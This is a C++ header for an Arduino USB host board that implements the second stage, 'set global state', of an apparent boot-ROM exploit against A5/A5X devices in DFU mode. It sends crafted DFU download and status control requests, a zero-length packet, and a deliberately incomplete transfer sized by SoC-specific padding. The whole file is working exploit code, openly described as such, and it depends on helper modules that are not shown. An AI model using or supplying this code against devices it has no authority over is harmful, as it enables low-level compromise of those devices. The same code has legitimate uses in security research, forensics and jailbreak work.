#ifndef GLOBAL_STATE_H
#define GLOBAL_STATE_H

#include <Arduino.h>
#include "Usb.h"
#include "../config/constants_named.h"
#include "../config/error_codes.h"
#include "../usb/usb_helpers.h"

/**
 * Global State Setup Module
 * 
 * This module handles setting up the global USB state for exploitation.
 * It exploits the difference in HOST2DEVICE control request processing
 * between newer and A5/A5X SoCs.
 */

class GlobalStateSetup {
private:
  USB* usb;
  int padding;
  
public:
  /**
   * Constructor
   * @param usbInstance Pointer to USB instance
   * @param paddingValue SoC-specific padding value
   */
  GlobalStateSetup(USB* usbInstance, int paddingValue) 
    : usb(usbInstance), padding(paddingValue) {}
  
  /**
   * Execute global state setup stage
   * 
   * This stage exploits the difference in HOST2DEVICE control request
   * processing between newer and A5/A5X SoCs to set up exploitable
   * global state without triggering zero-length packet reset.
   * 
   * @return Error code (ERR_NONE on success)
   */
  ExploitError execute() {
    Serial.println("\n=== STAGE 2: SET GLOBAL STATE ===");
    
    uint8_t tmpbuf[USB_PACKET_SIZE];
    uint8_t rcode;
    memset(tmpbuf, 0xcc, sizeof(tmpbuf));

    // Send DFU_DNLOAD request with data
    Serial.println("Sending DFU_DNLOAD setup...");
    rcode = usb->ctrlReq_SETUP(0, 0, DFU_REQUEST_TYPE_H2D, DFU_REQUEST_DNLOAD, 
                               0, 0, 0, USB_PACKET_SIZE);
    
    // Send pre-packet
    rcode = USBHelpers::sendOut(usb, tmpbuf, USB_PACKET_SIZE);
    Serial.print("  OUT pre-packet: 0x");
    Serial.println(rcode, HEX);
    
    // Send data packet
    rcode = USBHelpers::sendOut(usb, tmpbuf, USB_PACKET_SIZE);
    Serial.print("  OUT data packet: 0x");
    Serial.println(rcode, HEX);
    
    // Handshake
    rcode = usb->dispatchPkt(tokINHS, 0, 0);
    Serial.print("  IN handshake: 0x");
    Serial.println(rcode, HEX);

    // Send zero-length packet (triggers different behavior on A5/A5X)
    Serial.println("Sending zero-length packet...");
    rcode = usb->ctrlReq(0, 0, DFU_REQUEST_TYPE_H2D, DFU_REQUEST_DNLOAD, 
                        0, 0, 0, 0, 0, 0, 0);
    Serial.print("  Result: 0x");
    Serial.println(rcode, HEX);

    // Get status twice (required for exploit)
    Serial.println("Getting DFU status (x2)...");
    rcode = usb->ctrlReq(0, 0, DFU_REQUEST_TYPE_D2H, DFU_REQUEST_GETSTATUS, 
                        0, 0, 0, DFU_STATUS_SIZE, DFU_STATUS_SIZE, tmpbuf, 0);
    Serial.print("  Status #1: 0x");
    Serial.println(rcode, HEX);

    rcode = usb->ctrlReq(0, 0, DFU_REQUEST_TYPE_D2H, DFU_REQUEST_GETSTATUS, 
                        0, 0, 0, DFU_STATUS_SIZE, DFU_STATUS_SIZE, tmpbuf, 0);
    Serial.print("  Status #2: 0x");
    Serial.println(rcode, HEX);
    
    // Send incomplete control transfer to set global state
    Serial.print("Sending incomplete transfer (padding + 0x40 = 0x");
    Serial.print(padding + USB_PACKET_SIZE, HEX);
    Serial.println(" bytes)...");
    
    rcode = usb->ctrlReq_SETUP(0, 0, DFU_REQUEST_TYPE_H2D, DFU_REQUEST_DNLOAD, 
                               0, 0, 0, padding + USB_PACKET_SIZE);
    
    uint8_t io_buf[USB_PACKET_SIZE];
    int totalPackets = (padding + USB_PACKET_SIZE) / USB_PACKET_SIZE;
    
    for(int i = 0; i < totalPackets; i++) {
      rcode = USBHelpers::sendOut(usb, io_buf, USB_PACKET_SIZE);
      Serial.print("  Packet ");
      Serial.print(i + 1);
      Serial.print("/");
      Serial.print(totalPackets);
      Serial.print(": 0x");
      Serial.println(rcode, HEX);
      
      if(rcode) {
        Serial.println("ERROR: Sending failed!");
        return ERR_STATE_SETUP_FAILED;
      }
    }
    
    Serial.println("Global state setup complete!");
    return ERR_NONE;
  }
};

#endif // GLOBAL_STATE_H
